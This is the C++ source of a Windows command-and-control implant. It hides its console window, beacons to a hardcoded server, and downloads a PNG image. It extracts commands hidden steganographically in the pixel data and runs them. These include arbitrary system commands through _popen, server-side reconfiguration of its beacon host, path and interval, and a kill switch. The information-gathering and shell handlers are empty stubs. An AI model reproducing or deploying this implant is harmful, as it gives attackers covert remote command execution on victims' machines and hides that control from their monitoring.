// C2client.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include "client.h"
#include <wincodec.h>
#include <wincodecsdk.h>
#pragma comment(lib, "WindowsCodecs.lib")
#include <atlbase.h>
#include <atlcoll.h>





// To hide the console window I modified compiler settings as follows: Under linker set Subsystem to /SUBSYSTEM:windows  and Entry point to: mainCRTStartup
UINT GetStride(const UINT width, const UINT bitCount);
HRESULT getCommands(std::string *commands);
size_t executeCommands(std::vector<std::string>*);
size_t parseCommands(std::vector<std::string>* commandList, std::string commandHeader);

//Struct Types for command
//Command sequence: <COM: TYPE-VALUE:TYPE-VALUE....etc>

enum TYPE {
	KILL, //0-0
	CONF, //1-VAR-VAL
	GATH, //2-INF
	SHELL,//3-0
	EXEC, //4-COMMAND
};

//Global Variables
bool COInit = FALSE;				//COInit can only be initialized once
std::string ID = "ASAFW";
unsigned long int beaconTime = 0;	//How often client beacans out to server
std::string hostname = "10.0.0.35";
std::string port = "8080";
std::string path = "/images/default.png";

int main()
{	
	std::string commands;					//String to hold commands (Used to grab all encoded commands from image)
	std::vector<std::string> commandList;	//Vector to store each individual command
	HRESULT HR;								//Error handler for COM Objects
	/*Initialize Client*/
	//Initialize the COM library for use by the calling thread. This function must be called, and can only be called once from the same thread. 
	//pvReserved is reserved and must be NULL, COINT value is Apartment Threaded(Single Threaded COM Thread)
	if ((HR = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED)) != S_OK) {
		OutputDebugStringA("Client: Unable to inititialize COM Library\n");
		exit(EXIT_FAILURE);
	}
	client clientC;
	//Initialize client (Only need to initialize WSA once)
	clientC.clientInit();

	//Loop Forever here
	while (true) {
		//Sleep (Initial sleep is 0
		Sleep(beaconTime);
		//Connect to server
		if (clientC.clientConn(&clientC, hostname, port)) {
			continue;
		}
		//Send Get Request to C2
		if (clientC.sendRequest(&clientC, "GET " + path +  " HTTP/1.1")) {
			continue;
		}
		//Recieve respone
		if (clientC.recvResponse(&clientC)) {
			continue;
		}
		//Decode the image and get the commands

		if ((HR = getCommands(&commands)) != S_OK) {
			OutputDebugStringA("Server: Unable to grab encoded commands\n");
			continue;
		}
		//Parse Command header
		if (parseCommands(&commandList, commands) == -1) {
			OutputDebugStringA("Server: Unable to parse commands\n");
			//clear commands previously grabbed
			commandList.clear();
			commands = "";
			continue;
		}
		//Execute commangs grabbed
		executeCommands(&commandList);
		//Clear Commands
		commands = "";
		commandList.clear();
			
			

		
	}

}


//Grab Encoded commands from Image
HRESULT getCommands(std::string *commands ) {
	//Initialize Variables
	size_t commandL;			 //Size in bytes to parse
	std::string command;		//String to store encoded command
	HRESULT hr;					//Error handling 
	UINT frameCount = 0;		//Framecount (1 for PNGs, including this in now for future compatibility with other file formats)
	UINT width = 0;				//width fo the image
	UINT height = 0;			//Height of the image
	GUID pixelFormat = { 0 };	//Used to store the pixel format (Should be BGRA - 32bits)
	//create a CComPtr Istream smart pointer for managing the COM interface
	CComPtr<IStream> stream;
	//Create a smart pointer gain acces to the decoder's properties
	CComPtr<IWICBitmapDecoder> decoder;
	//Smart pointer to gain access to interface that defines methods for decoding individual image frames
	CComPtr<IWICBitmapFrameDecode> frame;
	//Open file and retrieve a stream to read from the file
	if ((hr = SHCreateStreamOnFileEx(L"temp.png", STGM_READ, FILE_ATTRIBUTE_NORMAL, FALSE, NULL, &stream)) != S_OK) {
		stream.Release();
		return hr;
	}
	//Create an instance of a COM object to the WICPNGDecoder interface
	if ((hr = decoder.CoCreateInstance(CLSID_WICPngDecoder)) != S_OK) {
		stream.Release();
		return hr;
	}
	//Initialize the png decoder with the encoded png stream
	if ((hr = decoder->Initialize(stream, WICDecodeMetadataCacheOnDemand)) != S_OK) {
		stream.Release();
		return hr;
	}
	//Grab the frame count
	if ((hr = decoder->GetFrameCount(&frameCount)) != S_OK) {
		stream.Release();
		return hr;
	}
	//Get the frame
	if ((hr = decoder->GetFrame(0, &frame)) != S_OK) {
		stream.Release();
		return hr;
	}
	//From the frame determine the width and height
	if ((hr = frame->GetSize(&width, &height)) != S_OK) {
		stream.Release();
		return hr;
	}
	//Grab the pixel format
	if ((hr = frame->GetPixelFormat(&pixelFormat)) != S_OK) {
		stream.Release();
		return hr;
	}
	//Validate pixel format. This project only supports 32 bit BGRA PNG files at the moment.
	if (pixelFormat != GUID_WICPixelFormat32bppBGRA) {
		stream.Release();
		return hr;
	}
	//Get the stride
	const UINT stride = GetStride(width, 32);
	//A CAtlArray will be used to store the image data
	//The Destructor will clean this up for us once the object goes out of context
	CAtlArray<BYTE> buffer;
	//Set the size of the array object to the size of the image
	buffer.SetCount(stride * height);
	//Copy the frame pixels to the CAtlArray buffer
	hr = frame->CopyPixels(0, stride, buffer.GetCount(), buffer.GetData());
	//Grab Length of the command hidden int he pixel (In Bytes). It will always be the lease significant byte of the BGR value (3rd pixel)
	commandL = buffer[2];
	//Iterate through the pixels and grab the least significant bytes of the BGR value (Since this is BGRA, we will be gabbing the red pixel value)
	for (int i = 1; i <= commandL;i++) {
		command += buffer[i*4+2];
	}
	*commands = command;
	//Release the stream.
	stream.Release();
	return hr;

}//CComPtr auto releases underlying IErrorInfo interface
//Parse Command Header for all commands in the encoded message;
size_t parseCommands(std::vector<std::string>* commandList, std::string commandHeader) {
	int currentPos = 0;	//Tail
	int nextPos = 0;	//Head
	//Move to the first position of : (Indicates first command)
	currentPos = commandHeader.find_first_of(":");
	if (currentPos == std::string::npos) {
		return -1;
	}
	//Go through entire string, grab each command, and append them to the commandList
	while (currentPos != std::string::npos) {
		//Increment to position of the next command; We will use this to grab the entire string betweem currentPos and nextPos
		nextPos = commandHeader.find_first_of(":", currentPos + 1);
		//If nextPos = npos, this is the last command, grab it and break from loop
		if (nextPos == std::string::npos) {
			commandList->push_back(commandHeader.substr(currentPos + 1, commandHeader.length() - currentPos-2));
			break;
		} 
		commandList->push_back(commandHeader.substr(currentPos + 1, nextPos - currentPos - 1));
		currentPos = nextPos;
	}
	return 0;
}
//Execute Commands
size_t executeCommands(std::vector<std::string>* list) {
	std::string varName;
	std::string varValue;
	//Iterate through commands and call them (Will need parsing later);
	for (auto n : *list) {
		//Grab the ID to see if commands are meant for this client, or if we need to ignore them
		if (n.find_first_of("-") == std::string::npos && n == list->at(0)){
			if (n == ID || n == "ALL") {
				OutputDebugStringA("Commands are meant for this client");
				continue;
			}else{
				OutputDebugStringA("Commands not meant for this client\n");
				return -1;
			}
		}
		//Get Type and Value of each command
		int type = std::stoi(n.substr(0, n.find_first_of("-")));
		std::string value = n.substr(n.find_first_of('-') + 1, n.length());
		//Idnetify type of command
		switch (type) {
			//Case Kill: Cleanup artificats and kill program
			case KILL:
				exit(0);
				break;
			//Case CONF: Configure a global variabl (Such as beaconing sequence, the URL to reach out to, etc....
			case CONF:
				//Grab var name
				varName = value.substr(0, value.find_first_of("-"));
				//Grab var value
				varValue = value.substr(value.find_first_of('-') + 1, value.length());
				if (varName == "hostname") {
					hostname = varValue;
				}
				if (varName == "path") {
					path = varValue;
				}
				else if (varName == "beacon") {
					beaconTime = atoi(varValue.c_str());
				}
				break;
			//Case GATH: Gather information and execute a post request to the server
			case GATH:
				break;
			//Establish a persistent connection to the server
			case SHELL:
				break;
			//Execute a Command
			case EXEC:
				char buff[4096];
				std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(value.c_str(), "rt"), &_pclose);
				if (!pipe) {
					OutputDebugStringA("Failed to execute system command\n");
				}
				else {
					while (fgets(buff, sizeof(buff), pipe.get()) != nullptr) {
						OutputDebugStringA(buff);
					}
				}
				break;
		}
		//Call System Commands
	}
	return true;
}
//Get the stride of the image
UINT GetStride(const UINT width, const UINT bitCount) {
	const UINT byteCount = bitCount / 8;
	const UINT stride = (width * byteCount);
	return stride;
}
